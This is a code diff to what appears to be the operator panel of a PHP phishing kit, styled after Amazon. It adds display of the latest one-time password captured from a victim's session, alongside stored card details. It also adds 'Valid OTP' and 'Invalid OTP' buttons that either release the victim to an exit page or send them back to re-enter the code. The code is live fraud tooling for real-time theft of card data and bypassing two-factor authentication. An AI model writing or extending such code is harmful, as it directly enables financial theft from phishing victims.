@@ -15,6 +15,7 @@ $currentSession = $sessions[$currentSessionId] ?? [];
 
 $awaitingOtp = !empty($_GET['awaiting_otp']);
 $otpSubmitted = !empty($_GET['otp_submitted']);
+$latestOtp = latest_otp_value($currentSession['otp'] ?? []);
 
 function latest_entry_summary(?array $entries): string
 {
@@ -40,6 +41,32 @@ function latest_entry_summary(?array $entries): string
     }
 
     return empty($summaryPairs) ? 'Awaiting submission.' : implode(' | ', $summaryPairs);
+}
+
+function latest_otp_value(?array $entries): ?string
+{
+    if (empty($entries)) {
+        return null;
+    }
+
+    $latest = end($entries);
+    if (!is_array($latest)) {
+        return null;
+    }
+
+    $payload = $latest['payload'] ?? [];
+    if (!is_array($payload)) {
+        return null;
+    }
+
+    $otp = $payload['otp'] ?? null;
+    if (!is_scalar($otp)) {
+        return null;
+    }
+
+    $otpString = trim((string)$otp);
+
+    return $otpString === '' ? null : $otpString;
 }
 ?>
 <!doctype html>
@@ -94,6 +121,9 @@ function latest_entry_summary(?array $entries): string
             flex-direction: column;
             margin-top: 24px;
         }
+        .decision-actions {
+            margin-top: 18px;
+        }
         .a-button {
             display: inline-block;
             text-decoration: none;
@@ -109,10 +139,33 @@ function latest_entry_summary(?array $entries): string
         .a-button:hover {
             background: linear-gradient(#f5d78e,#eeb933);
         }
+        .a-button--success {
+            background: linear-gradient(#d5f6d0,#a8e89b);
+            border-color: #6c9a4b;
+        }
+        .a-button--success:hover {
+            background: linear-gradient(#c6efc0,#8fdb82);
+        }
+        .a-button--secondary {
+            background: linear-gradient(#fefefe,#e7e9ec);
+            border-color: #adb1b8;
+        }
+        .a-button--secondary:hover {
+            background: linear-gradient(#f7f8fa,#d5d9dc);
+        }
         .note {
             font-size: 0.8rem;
             color: #565959;
             margin-top: 4px;
+        }
+        .decision-actions .note {
+            margin-top: 0;
+        }
+        .otp-value {
+            font-size: 1.1rem;
+            font-weight: 600;
+            letter-spacing: 0.08em;
+            text-align: center;
         }
         .status {
             background-color: #dff0d8;
@@ -154,12 +207,29 @@ function latest_entry_summary(?array $entries): string
             <div class="entry-summary"><?php echo htmlspecialchars(latest_entry_summary($currentSession['card'] ?? []), ENT_QUOTES, 'UTF-8'); ?></div>
         </div>
 
-        <div class="actions">
-            <form action="otp.php" method="get">
-                <button type="submit" class="a-button">Grab OTP</button>
-            </form>
-            <span class="note">You will be directed to the secure verification page to enter the one-time password.</span>
-        </div>
+        <?php if ($latestOtp !== null): ?>
+            <div class="entry-group">
+                <h2>One-time Password</h2>
+                <div class="entry-summary otp-value"><?php echo htmlspecialchars($latestOtp, ENT_QUOTES, 'UTF-8'); ?></div>
+            </div>
+            <div class="actions decision-actions">
+                <form action="exit.php" method="post">
+                    <button type="submit" class="a-button a-button--success">Valid OTP</button>
+                </form>
+                <form action="otp.php" method="get">
+                    <input type="hidden" name="error" value="invalid">
+                    <button type="submit" class="a-button a-button--secondary">Invalid OTP</button>
+                </form>
+                <span class="note">Choose how to proceed with the submitted verification code.</span>
+            </div>
+        <?php else: ?>
+            <div class="actions">
+                <form action="otp.php" method="get">
+                    <button type="submit" class="a-button">Grab OTP</button>
+                </form>
+                <span class="note">You will be directed to the secure verification page to enter the one-time password.</span>
+            </div>
+        <?php endif; ?>
     </div>
 </body>
 </html>
